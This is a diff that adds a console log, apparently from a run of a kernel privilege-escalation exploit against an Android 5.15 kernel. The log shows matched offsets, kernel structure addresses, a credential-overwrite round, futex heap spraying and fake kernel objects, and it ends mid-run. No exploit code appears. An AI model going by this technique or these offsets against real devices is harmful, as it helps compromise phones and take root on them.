@@ -1,0 +1,20 @@
+[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
+[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
+[32m[+] [0mstartup context pid=12164 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=0
+[32m[+] [0mstartup limits pid=12164 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=12164 label=ghostlock_nevada slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=12164 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
+[33m[*] [0m[T+0ms] exploit start
+[32m[+] [0mSELinux already off
+[33m[*] [0m[T+4882ms] pre-W2 drain
+[33m[*] [0mperf task: 0xffffff80f10ba400 (49/256 votes)
+[33m[*] [0m[T+5080ms] perf_find_task done
+[33m[*] [0mchild_pid=14166 child_task=0xffffff80f10ba400
+[33m[*] [0mround 1/10: cred write
+[33m[*] [0m=== W2: cred === target=0xffffff80f10bab98 mode=2
+[33m[*] [0m[T+10123ms]   heap spray start
+[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
+[33m[*] [0mks collisions=3/3 baseline=8 threshold=10x (80) accepted=[15119..15945] slowest_rejected=5
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+17962ms]   heap spray done
+[33m[*] [0mpselect route setup attempt=1 simple=0 shift=0 page=ffffff80cacb0000 fake_lock=ffffff80cacb0000 fake_w0=ffffff80cacb0300 fake_task=ffffff80cacb0400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000003 ex1=0000000000000001 ex2=0000000000000000 ex3=0000000000000000
